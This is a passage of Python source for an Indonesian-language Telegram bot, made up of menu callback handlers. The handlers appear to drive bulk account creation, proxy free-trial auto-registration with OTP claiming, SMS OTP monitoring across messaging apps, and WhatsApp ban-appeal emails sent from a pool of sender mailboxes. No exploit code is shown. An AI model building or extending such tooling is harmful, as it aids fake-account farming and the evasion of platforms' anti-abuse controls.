                InlineKeyboardButton("HAPUS SEMUA", callback_data=f"fxdelall_{user_id}",
                                     icon_custom_emoji_id=E2, style="danger"),
            ],
            [
                InlineKeyboardButton("KEMBALI", callback_data=f"fixmenu_{user_id}",
                                     icon_custom_emoji_id=E1, style="primary"),
            ],
        ])
        body = _screen('DELETE SENDER', (
            f"{em(E2,'🗑')} <b>Hapus sender dari pool</b>\n\n"
            f"  Server 1 (id ≤ 150): <b>{s['s1_total']}</b>\n"
            f"  Server 2 (id > 150): <b>{s['s2_total']}</b>\n"
            f"  Total: <b>{s['total']}</b>\n\n"
            f"<b>Pilih partisi yang mau dihapus.</b>\n"
            f"<i>Akun yatim (tanpa mailbox) ikut terhapus.</i>"
        ))
        try:
            await query.message.edit_text(body, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        return

    # ── Eksekusi hapus (owner) ──
    if (data.startswith('fxdelall_') or data.startswith('fxdels1_')
            or data.startswith('fxdels2_')):
        await query.answer()
        if not is_owner(user_id):
            return
        if data.startswith('fxdelall_'):
            where, label = "1=1", "SEMUA sender"
        elif data.startswith('fxdels1_'):
            where, label = f"id IN ({_S1_IDS_SQL})", "Server 1 (150 sender pertama)"
        else:
            where, label = f"id NOT IN ({_S1_IDS_SQL})", "Server 2 (sisanya)"
        try:
            cur.execute(f"DELETE FROM sitepro_mailboxes WHERE {where}")
            deleted_mb = cur.rowcount if hasattr(cur, 'rowcount') else 0
            cur.execute(
                "DELETE FROM sitepro_accounts WHERE id NOT IN "
                "(SELECT DISTINCT account_id FROM sitepro_mailboxes WHERE account_id IS NOT NULL)"
            )
            deleted_acc = cur.rowcount if hasattr(cur, 'rowcount') else 0
            conn.commit()
            msg = (
                f"{em(E1,'✅')} <b>BERHASIL DIHAPUS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  Partisi : <b>{label}</b>\n"
                f"  Mailbox : <b>{deleted_mb}</b> dihapus\n"
                f"  Akun    : <b>{deleted_acc}</b> ikut dihapus (yatim)\n"
            )
        except Exception as e:
            msg = f"{em(E2,'❌')} <b>Gagal hapus:</b> <code>{html.escape(str(e))}</code>"
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("KEMBALI", callback_data=f"fixmenu_{user_id}",
                                 icon_custom_emoji_id=E1, style="primary"),
        ]])
        try:
            await query.message.edit_text(_screen('DELETE SENDER', msg),
                                          parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        return

    # ── TEMPLATE: preview pesan /fix (owner) ──
    if data.startswith('fxprev_'):
        await query.answer()
        if not is_owner(user_id):
            return
        sample = "6281234567890"
        try:
            tpl = get_user_fix_template(user_id)
        except Exception:
            tpl = None
        if tpl:
            body_txt = tpl.replace("{nomor}", sample) if "{nomor}" in tpl else (tpl + f"\n\n+{sample}")
            source = "custom (/set)"
        else:
            body_txt = (
                "Olá, Equipe de Suporte do WhatsApp, ...\n\n"
                f"Número de telefone : +{sample}\n\n"
                "(template default Português — gunakan /set untuk membuat custom)"
            )
            source = "default"
        import html as _h
        kb = InlineKeyboardMarkup([[
            InlineKeyboardButton("KEMBALI", callback_data=f"fixmenu_{user_id}",
                                 icon_custom_emoji_id=E1, style="primary"),
        ]])
        body = _screen('PREVIEW TEMPLATE', (
            f"{em(E1,'📝')} <b>Sumber:</b> {source}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{_h.escape(body_txt)}\n\n"
            f"<i>Ini hanya preview. Tidak ada email yang dikirim.</i>"
        ))
        try:
            await query.message.edit_text(body, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass
        return

    if data.startswith('fix_back_'):
        await query.answer()
        # Bersihkan state tunggu input
        context.user_data.pop('fixmenu_waiting', None)
        context.user_data.pop('fixmenu_message_id', None)
        # Kembali ke dashboard /start
        try:
            await start_command(update, context)
        except Exception:
            try:
                await query.message.edit_text(
                    _screen('FIX MERAH WHATSAPP', f"{em(E2,'❌')} <b>Dibatalkan.</b>"),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        return

    if data.startswith(('create_confirm_', 'create_sel_', 'create_api_')):
        await query.answer()
        count_key = f"create_count_{user_id}"
        count = context.user_data.get(count_key, 0)
        if not count:
            await query.message.edit_text(
                _screen('CREATE AKUN',
                        f"{em(E2,'❌')} Data tidak ditemukan. Coba /create lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[count_key]
        # Dispatch berdasarkan prefix:
        if data.startswith('create_api_'):
            await query.message.edit_text(
                _screen('CREATE AKUN · API',
                        f"{em(CE_LOADING,'🟠')} <b>Memulai pipeline API untuk {count} akun...</b>"),
                parse_mode=ParseMode.HTML,
            )
            asyncio.create_task(
                _process_create_api_background(count, user_id, query.message)
            )
        else:
            # create_confirm_ (legacy) & create_sel_ → Selenium pipeline lama
            await query.message.edit_text(
                _screen('CREATE AKUN · SELENIUM',
                        f"{em(CE_LOADING,'🟠')} <b>Memulai pembuatan {count} akun...</b>"),
                parse_mode=ParseMode.HTML,
            )
            asyncio.create_task(_process_create_background(count, user_id, query.message))
        return

    if data.startswith('create_cancel_'):
        await query.answer()
        count_key = f"create_count_{user_id}"
        context.user_data.pop(count_key, None)
        await query.message.edit_text(
            _screen('CREATE AKUN', f"{em(E2,'❌')} <b>Dibatalkan.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    # ── OwlProxy /proxy callbacks ──────────────────────────────────
    if data.startswith(('proxy_socks5_', 'proxy_http_')):
        await query.answer()
        proto = "socks5" if data.startswith('proxy_socks5_') else "http"
        count_key = f"proxy_count_{user_id}"
        count = context.user_data.get(count_key, 1)
        if not count:
            await query.message.edit_text(
                _screen('PROXY',
                        f"{em(E2,'❌')} Data tidak ditemukan. Coba /proxy lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        context.user_data.pop(count_key, None)
        await query.message.edit_text(
            _screen(f'PROXY · {proto.upper()}', (
                f"{em(CE_LOADING,'🟠')} <b>Memulai auto-registration...</b>\n\n"
                f"  {em(CE_NEGARA,'🌐')} Tipe: <code>{proto.upper()}</code>\n"
                f"  {em(CE_WAKTU,'📋')} Jumlah: <code>{count}</code>\n\n"
                f"{em(CE_WAKTU,'⏲')} <i>Generating email + OTP + login + claim...</i>"
            )),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_proxy_worker(proto, count, user_id, query.message, context.bot))
        return

    if data.startswith('proxy_cancel_'):
        await query.answer()
        context.user_data.pop(f"proxy_count_{user_id}", None)
        await query.message.edit_text(
            _screen('PROXY', f"{em(E2,'❌')} <b>Dibatalkan.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith('proxy_close_'):
        await query.answer()
        try:
            await query.message.delete()
        except Exception:
            await query.message.edit_text(
                f"{em(E1,'✅')} <i>Closed.</i>", parse_mode=ParseMode.HTML)
        return

    if data.startswith('proxy_again_'):
        await query.answer()
        await query.message.edit_text(
            _screen('PROXY', f"{em(CE_NEGARA,'🌐')} Gunakan <code>/proxy [jumlah]</code> untuk buat lagi."),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith('sub_sms_'):
        await query.answer()
        await query.edit_message_text(
            _screen('SMS & NOTIFIKASI',
                    f"Pilih layanan SMS:\n\n  {em(CE_MONITOR,'📡')} Monitor interval: <code>{MONITOR_INTERVAL}s</code>\n  {em(E1,'📨')} SMS Aktif interval: <code>{SMS_AKTIF_INTERVAL}s</code>",
                    'Menu › SMS'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_sms_keyboard(user_id),
        )
        return

    if data.startswith('sub_nomor_'):
        await query.answer()
        await query.edit_message_text(
            _screen('MANAJEMEN NOMOR', "Kelola nomor aktif, export, dan favorit range.", 'Menu › Nomor'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_nomor_keyboard(user_id),
        )
        return

    if data.startswith('sub_data_'):
        await query.answer()
        await query.edit_message_text(
            _screen('DATA & STATISTIK', "Platform tersedia dan negara aktif.", 'Menu › Data'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_data_keyboard(user_id),
        )
        return

    if data.startswith('sub_akun_'):
        await query.answer()
        await query.edit_message_text(
            _screen('AKUN & TOOLS', "Multi-akun, logout, dan pengaturan user.", 'Menu › Akun'),
            parse_mode=ParseMode.HTML,
            reply_markup=get_sub_akun_keyboard(user_id),
        )
        return

    if data.startswith('menu_help_'):
        await query.answer()
        await help_command(update, context)
        return

    if data.startswith('sms_hist_'):
        await query.answer()
        parts = data.split('_')
        page = int(parts[-1]) if parts[-1].isdigit() else 0
        await show_sms_history(update, context, user_id, page)
        return

    if data.startswith('monitor_filter_'):
        await query.answer()
        prefs = get_user_prefs(user_id)
        cur_f = prefs.get('monitor_app_filter', 'all')
        filters = ['all', 'whatsapp', 'telegram', 'tiktok', 'facebook', 'instagram', 'google', 'microsoft', 'viber']
        kb = []
        row = []
        for f in filters:
            mark = '✓ ' if f == cur_f else ''
            row.append(InlineKeyboardButton(f"{mark}{_app_filter_label(f)}", callback_data=f"monitor_set_{f}_{user_id}", style="success" if f == cur_f else "primary"))
            if len(row) == 2:
                kb.append(row)
                row = []
        if row:
            kb.append(row)
        kb.append([InlineKeyboardButton("KEMBALI", callback_data=f"sub_sms_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")])
        await query.edit_message_text(
            _screen('FILTER MONITOR SMS', f"Filter aktif: <b>{_app_filter_label(cur_f)}</b>\n\nPilih service untuk notifikasi monitor:", 'Menu › SMS › Filter'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb),
        )
        return

    if data.startswith('monitor_set_'):
        rest = data[len('monitor_set_'):]
        idx = rest.rfind('_')
        if idx > 0:
            app_f = rest[:idx]
            set_user_pref(user_id, monitor_app_filter=app_f)
            await query.answer(f"Filter: {_app_filter_label(app_f)}", show_alert=True)
        query.data = f"monitor_filter_{user_id}"
        await menu_callback(update, context)
        return

    if data.startswith('menu_fav_'):
        await query.answer()
        favs = get_favorite_ranges(user_id, limit=8)
        context.user_data[f'fav_list_{user_id}'] = favs
        kb = []
        if favs:
            body = f"{em(E1,'⭐')} <b>Favorit Range</b> (tap untuk add):\n\n"
            for i, fn in enumerate(favs):
                short = fn[:24] + '…' if len(fn) > 24 else fn
                kb.append([
                    InlineKeyboardButton(f"▶ {short}", callback_data=f"fav_ix_{user_id}_add_{i}", style="success"),
                    InlineKeyboardButton("✖", callback_data=f"fav_ix_{user_id}_del_{i}", style="danger"),
                ])
                body += f"  • <code>{html.escape(fn)}</code>\n"
        else:
            body = (
                f"  {em(E2,'📭')} Belum ada favorit.\n\n"
                f"Tambah dengan: <code>/fav NAMA_RANGE</code>\n"
                f"Contoh: <code>/fav PERU_01</code>"
            )
        kb.append([InlineKeyboardButton("KEMBALI", callback_data=f"sub_nomor_{user_id}", icon_custom_emoji_id=CE_BACK, style="danger")])
        await query.edit_message_text(
            _screen('FAVORIT RANGE', body, 'Menu › Nomor › Favorit'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb),
        )
        return

    if data.startswith('fav_ix_'):
        # fav_ix_{uid}_add_{i} — uid bisa multi digit
        m = re.match(r'^fav_ix_(\d+)_(add|del)_(\d+)$', data)
        if m:
            action = m.group(2)
            idx = int(m.group(3))
            favs = context.user_data.get(f'fav_list_{user_id}', get_favorite_ranges(user_id, 8))
            if 0 <= idx < len(favs):
                range_name = favs[idx]
                if action == 'del':
                    remove_favorite_range(user_id, range_name)
                    await query.answer("Dihapus dari favorit", show_alert=True)
                    query.data = f"menu_fav_{user_id}"
                    await menu_callback(update, context)
                    return
                if action == 'add':
                    email, _, _, _, _, _, logged_in = get_user_session(user_id)
                    if logged_in and email:
                        await query.answer(f"Menambah {range_name[:20]}…")
                        task_id = f"fav_{user_id}_{int(time.time())}"
                        asyncio.create_task(process_add_background(
                            query.message, user_id, email, range_name, task_id, "fav"
                        ))
                        return
        await query.answer("Gagal", show_alert=True)
        return

    if data.startswith('menu_notif_'):
        try:
            target_uid = int(data.replace('menu_notif_', ''))
        except:
            target_uid = user_id
            
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return
            
        if user_id in active_notif_monitor:
            # Stop monitor
            active_notif_monitor.remove(user_id)
            if user_id in notif_start_time:
                notif_start_time.pop(user_id, None)
            notif_sms_count.pop(user_id, None)
            notif_seen_sms.pop(user_id, None)
            await query.answer("🔴 Monitor SMS dinonaktifkan!", show_alert=True)
        else:
            # Start monitor
            active_notif_monitor.add(user_id)
            notif_start_time[user_id] = datetime.now()
            notif_sms_count[user_id] = 0
            notif_seen_sms[user_id] = set()
            await query.answer("🟢 Monitor SMS diaktifkan (Setiap {}s)!".format(MONITOR_INTERVAL), show_alert=True)
            
        await start_command(update, context)
        return

    if data.startswith('notif_copy_'):
        otp_code = data[len('notif_copy_'):]
        await query.answer(f"📋 {otp_code}\n\n(Tahan lalu salin dari alert ini)", show_alert=True)
        return

    # ─── USER MENU ──────────────────────────────────────────
    if data.startswith('user_menu_'):
        try:
            target_uid = int(data.replace('user_menu_', ''))
        except:
            target_uid = user_id
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        await query.answer()
        is_smsaktif = user_id in sms_aktif_users
        is_monitor = user_id in active_notif_monitor

        text = (
            f"📋 <b>MENU USER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📨 <b>SMS AKTIF</b>: {'🟢 Running' if is_smsaktif else '🔴 Off'}\n"
            f"📡 <b>Monitor SMS</b>: {'🟢 Running' if is_monitor else '🔴 Off'}\n\n"
            f"Pilih fitur yang ingin digunakan:\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        keyboard = [
            [InlineKeyboardButton(f"SMS AKTIF {'🟢' if is_smsaktif else '🔴'}", callback_data=f"smsaktif_menu_{user_id}", style="primary")],
            [InlineKeyboardButton("KEMBALI KE MAIN MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
        ]

        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # ─── SMS AKTIF CALLBACKS ─────────────────────────────────
    if data.startswith('smsaktif_menu_'):
        try:
            target_uid = int(data.replace('smsaktif_menu_', ''))
        except:
            target_uid = user_id

        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        await query.answer()
        bot_token, chat_id, is_active, app_filter = get_user_bot_token(user_id)
        app_filter = app_filter or 'all'
        is_running = user_id in sms_aktif_users

        status = "🟢 AKTIF" if is_running else "🔴 NON-AKTIF"
        bot_info = f"<code>{bot_token[:15]}...{bot_token[-10:]}</code>" if bot_token else "<i>Belum diset</i>"
        chat_info = f"<code>{chat_id}</code>" if chat_id else "<i>Belum diset</i>"

        # App filter display
        filter_labels = {
            'all': '📋 Semua Service',
            'whatsapp': '💬 WhatsApp',
            'telegram': '✈️ Telegram',
            'tiktok': '🎵 TikTok',
            'facebook': '👤 Facebook',
            'instagram': '📷 Instagram',
            'google': '🔍 Google',
            'microsoft': '🪟 Microsoft',
            'viber': '📞 Viber',
        }
        filter_display = filter_labels.get(app_filter, f'🏷 {app_filter}')

        uptime_text = ""
        if is_running and user_id in sms_aktif_start_time:
            delta = datetime.now() - sms_aktif_start_time[user_id]
            mins = int(delta.total_seconds() // 60)
            uptime_text = f"\n⏲ <b>Uptime</b>: <code>{mins} menit</code>"

        sms_count = sms_aktif_count.get(user_id, 0)

        text = (
            f"📨 <b>SMS AKTIF - MONITOR PRIBADI</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 <b>Status</b>: {status}{uptime_text}\n"
            f"🤖 <b>Bot Token</b>: {bot_info}\n"
            f"💬 <b>Chat ID</b>: {chat_info}\n"
            f"🏷 <b>Filter</b>: {filter_display}\n"
            f"📩 <b>SMS Terdeteksi</b>: <code>{sms_count}</code>\n\n"
            f"<b>Cara Kerja:</b>\n"
            f"1️⃣ Buat bot di @BotFather\n"
            f"2️⃣ Kirim bot token ke sini\n"
            f"3️⃣ Pilih filter service (WA/TG/Semua)\n"
            f"4️⃣ Real-time setiap 2 detik!\n\n"
            f"<b>Fitur:</b>\n"
            f"• Auto-detect OTP/Code (tap to copy)\n"
            f"• Filter per service\n"
            f"• Hanya SMS baru, tidak spam ulang\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        keyboard = []
        if bot_token and chat_id:
            if is_running:
                keyboard.append([InlineKeyboardButton("STOP SMS AKTIF", callback_data=f"smsaktif_stop_{user_id}", icon_custom_emoji_id="5870778972857438051", style="danger")])
            else:
                keyboard.append([InlineKeyboardButton("START SMS AKTIF", callback_data=f"smsaktif_start_{user_id}", icon_custom_emoji_id="5870921127685001066", style="success")])
            keyboard.append([InlineKeyboardButton(f"FILTER: {filter_display}", callback_data=f"smsaktif_filter_{user_id}", style="primary")])
            keyboard.append([
                InlineKeyboardButton("GANTI TOKEN", callback_data=f"smsaktif_settoken_{user_id}", icon_custom_emoji_id="5870892901159932239", style="primary"),
                InlineKeyboardButton("HAPUS TOKEN", callback_data=f"smsaktif_deltoken_{user_id}", icon_custom_emoji_id="5870875489362513438", style="danger")
            ])
        else:
            keyboard.append([InlineKeyboardButton("SET BOT TOKEN", callback_data=f"smsaktif_settoken_{user_id}", icon_custom_emoji_id="5870531058755178453", style="success")])

        keyboard.append([InlineKeyboardButton("KEMBALI", callback_data=f"user_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")])

        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith('smsaktif_settoken_'):
        try:
            target_uid = int(data.replace('smsaktif_settoken_', ''))
        except:
            target_uid = user_id
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        context.user_data[f'waiting_smsaktif_token_{user_id}'] = True
        await query.edit_message_text(
            f"🤖 <b>SET BOT TOKEN - SMS AKTIF</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Silakan kirimkan <b>Bot Token</b> dari @BotFather.\n\n"
            f"<b>Langkah:</b>\n"
            f"1. Buka @BotFather di Telegram\n"
            f"2. Ketik /newbot dan ikuti instruksi\n"
            f"3. Copy token yang diberikan\n"
            f"4. Paste di sini\n\n"
            f"<i>Format: 123456789:ABCDefGHIjklMNOpqrSTUvwxYZ</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("BATAL", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5870601874175954911", style="danger")
            ]])
        )
        return

    if data.startswith('smsaktif_start_'):
        try:
            target_uid = int(data.replace('smsaktif_start_', ''))
        except:
            target_uid = user_id
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        bot_token, chat_id, _, _af = get_user_bot_token(user_id)
        if not bot_token or not chat_id:
            await query.answer("❌ Bot token belum diset!", show_alert=True)
            return

        # Verify session active
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id)
        if not logged_in:
            await query.answer("❌ Session expired! Login ulang dulu.", show_alert=True)
            return

        sms_aktif_users.add(user_id)
        sms_aktif_start_time[user_id] = datetime.now()
        sms_aktif_count[user_id] = 0
        sms_aktif_seen[user_id] = set()

        # Send test message to user's bot
        test_text = (
            f"✅ <b>SMS AKTIF STARTED!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 Monitor SMS real-time telah diaktifkan.\n"
            f"⏲ Interval: setiap 5 detik\n"
            f"📩 SEMUA SMS baru akan muncul di sini.\n"
            f"🗑 Auto-hapus setelah 5 menit.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        stop_markup = {
            'inline_keyboard': [[
                {'text': '🛑 STOP SMS AKTIF', 'callback_data': f'stop_smsaktif_{user_id}'}
            ]]
        }
        await bg.run(user_id, _send_to_user_bot, bot_token, chat_id, test_text, stop_markup)

        await query.answer("🟢 SMS AKTIF diaktifkan!", show_alert=True)
        # Refresh menu
        await query.edit_message_text(
            f"✅ <b>SMS AKTIF - RUNNING</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 Status: 🟢 AKTIF\n"
            f"⏲ Interval: 5 detik\n"
            f"📩 SEMUA SMS baru dikirim ke bot kamu.\n"
            f"🗑 Auto-hapus setelah 5 menit.\n\n"
            f"<i>Cek bot kamu untuk menerima notifikasi.</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("STOP SMS AKTIF", callback_data=f"smsaktif_stop_{user_id}", icon_custom_emoji_id="5870778972857438051", style="danger")],
                [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
            ])
        )
        return

    if data.startswith('smsaktif_stop_'):
        try:
            target_uid = int(data.replace('smsaktif_stop_', ''))
        except:
            target_uid = user_id
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        duration_text = ""
        if user_id in sms_aktif_start_time:
            delta = datetime.now() - sms_aktif_start_time.pop(user_id)
            mins = int(delta.total_seconds() // 60)
            secs = int(delta.total_seconds() % 60)
            duration_text = f"\n⏲ <b>Durasi</b>: <code>{mins}m {secs}s</code>"

        sms_detected = sms_aktif_count.pop(user_id, 0)
        sms_aktif_users.discard(user_id)
        sms_aktif_seen.pop(user_id, None)

        await query.answer("🔴 SMS AKTIF dihentikan!", show_alert=True)
        await query.edit_message_text(
            f"🛑 <b>SMS AKTIF - STOPPED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📡 Status: 🔴 STOPPED{duration_text}\n"
            f"📩 SMS Terdeteksi: <code>{sms_detected}</code>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("START LAGI", callback_data=f"smsaktif_start_{user_id}", icon_custom_emoji_id="5870921127685001066", style="success")],
                [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
            ])
        )
        return

    if data.startswith('smsaktif_deltoken_'):
        try:
            target_uid = int(data.replace('smsaktif_deltoken_', ''))
        except:
            target_uid = user_id
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        # Stop if running
        sms_aktif_users.discard(user_id)
        sms_aktif_seen.pop(user_id, None)
        sms_aktif_start_time.pop(user_id, None)
        sms_aktif_count.pop(user_id, None)
        delete_user_bot_token(user_id)

        await query.answer("🗑 Bot token dihapus!", show_alert=True)
        await query.edit_message_text(
            f"🗑 <b>BOT TOKEN DIHAPUS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Bot token kamu telah dihapus.\n"
            f"SMS AKTIF tidak akan berjalan sampai kamu set token baru.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("SET BOT TOKEN BARU", callback_data=f"smsaktif_settoken_{user_id}", icon_custom_emoji_id="5870531058755178453", style="success")],
                [InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
            ])
        )
        return

    if data.startswith('smsaktif_filter_'):
        try:
            target_uid = int(data.replace('smsaktif_filter_', ''))
        except:
            target_uid = user_id
        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        _, _, _, current_filter = get_user_bot_token(user_id)
        current_filter = current_filter or 'all'

        await query.answer()
        text = (
            f"🏷 <b>PILIH FILTER SERVICE</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Filter saat ini: <b>{current_filter.upper()}</b>\n\n"
            f"Pilih service mana yang ingin dimonitor:\n"
            f"• <b>SEMUA</b> = terima semua SMS\n"
            f"• <b>WhatsApp/Telegram/dll</b> = hanya dari service itu\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        keyboard = [
            [
                InlineKeyboardButton(f"{'✅' if current_filter == 'all' else '⬜'} SEMUA", callback_data=f"smsaktif_setfilter_{user_id}_all", style="primary"),
            ],
            [
                InlineKeyboardButton(f"{'✅' if current_filter == 'whatsapp' else '⬜'} WhatsApp", callback_data=f"smsaktif_setfilter_{user_id}_whatsapp", style="primary"),
                InlineKeyboardButton(f"{'✅' if current_filter == 'telegram' else '⬜'} Telegram", callback_data=f"smsaktif_setfilter_{user_id}_telegram", style="primary"),
            ],
            [
                InlineKeyboardButton(f"{'✅' if current_filter == 'tiktok' else '⬜'} TikTok", callback_data=f"smsaktif_setfilter_{user_id}_tiktok", style="primary"),
                InlineKeyboardButton(f"{'✅' if current_filter == 'facebook' else '⬜'} Facebook", callback_data=f"smsaktif_setfilter_{user_id}_facebook", style="primary"),
            ],
            [
                InlineKeyboardButton(f"{'✅' if current_filter == 'instagram' else '⬜'} Instagram", callback_data=f"smsaktif_setfilter_{user_id}_instagram", style="primary"),
                InlineKeyboardButton(f"{'✅' if current_filter == 'google' else '⬜'} Google", callback_data=f"smsaktif_setfilter_{user_id}_google", style="primary"),
            ],
            [
                InlineKeyboardButton(f"{'✅' if current_filter == 'microsoft' else '⬜'} Microsoft", callback_data=f"smsaktif_setfilter_{user_id}_microsoft", style="primary"),
                InlineKeyboardButton(f"{'✅' if current_filter == 'viber' else '⬜'} Viber", callback_data=f"smsaktif_setfilter_{user_id}_viber", style="primary"),
            ],
            [InlineKeyboardButton("KEMBALI", callback_data=f"smsaktif_menu_{user_id}", icon_custom_emoji_id="5449847653586188540", style="danger")]
        ]

        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if data.startswith('smsaktif_setfilter_'):
        # Format: smsaktif_setfilter_{user_id}_{filter}
        parts = data.replace('smsaktif_setfilter_', '').rsplit('_', 1)
        if len(parts) != 2:
            await query.answer("❌ Invalid filter!", show_alert=True)
            return
        try:
            target_uid = int(parts[0])
        except:
            target_uid = user_id
        new_filter = parts[1]

        if target_uid != user_id and user_id != USER_ID:
            await query.answer("Bukan untuk kamu!", show_alert=True)
            return

        valid_filters = ['all', 'whatsapp', 'telegram', 'tiktok', 'facebook', 'instagram', 'google', 'microsoft', 'viber']
        if new_filter not in valid_filters:
            await query.answer("❌ Filter tidak valid!", show_alert=True)
            return

        update_user_app_filter(user_id, new_filter)

        filter_labels = {
            'all': '📋 Semua', 'whatsapp': '💬 WhatsApp', 'telegram': '✈️ Telegram',
            'tiktok': '🎵 TikTok', 'facebook': '👤 Facebook', 'instagram': '📷 Instagram',
            'google': '🔍 Google', 'microsoft': '🪟 Microsoft', 'viber': '📞 Viber',
        }
        await query.answer(f"✅ Filter diubah ke: {filter_labels.get(new_filter, new_filter)}", show_alert=True)

        # Refresh filter menu (re-trigger filter callback)
        query.data = f"smsaktif_filter_{user_id}"
        await menu_callback(update, context)
        return

    if data == 'owner_smsaktif_status':
        if not is_owner(user_id):
            await query.answer("❌ Owner only!", show_alert=True)
            return
        await query.answer()

        if not sms_aktif_users:
            text = (
                f"📨 <b>SMS AKTIF STATUS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📭 Tidak ada user yang menggunakan SMS AKTIF saat ini.\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )
        else:
            lines = []
            for uid in list(sms_aktif_users):
                uptime_str = "?"
                if uid in sms_aktif_start_time:
                    delta = datetime.now() - sms_aktif_start_time[uid]
                    mins = int(delta.total_seconds() // 60)
                    uptime_str = f"{mins}m"
                count = sms_aktif_count.get(uid, 0)
                lines.append(f"  • <code>{uid}</code> | ⏲ {uptime_str} | 📩 {count} SMS")

            text = (
                f"📨 <b>SMS AKTIF STATUS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📡 <b>Active Users</b>: <code>{len(sms_aktif_users)}</code>\n\n"
                + "\n".join(lines) +
                f"\n\n━━━━━━━━━━━━━━━━━━━━━━"
            )

        await query.edit_message_text(
            text, parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("KEMBALI", callback_data="owner_menu", icon_custom_emoji_id="5449847653586188540", style="danger")
            ]])
        )
        return
    # ─── END SMS AKTIF CALLBACKS ─────────────────────────────

    if data == 'owner_add_admin_prompt':
        context.user_data[f'waiting_owner_add_admin_{user_id}'] = True
        await query.edit_message_text(
            f"{em(CE_ADD, '➕')} <b>TAMBAH ADMIN BARU</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Silakan kirimkan <b>User ID</b> atau <b>@username</b> user yang ingin Anda angkat sebagai Admin.\n\n<i>Contoh: 123456789 atau @username</i>\n\n"
            f"<i>Contoh: 123456789</i>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("BATAL", callback_data="owner_menu", icon_custom_emoji_id="5870601874175954911", style="danger")
            ]])
        )
        return

    if data == 'owner_del_admin_prompt':
        cur.execute("SELECT user_id FROM admins")
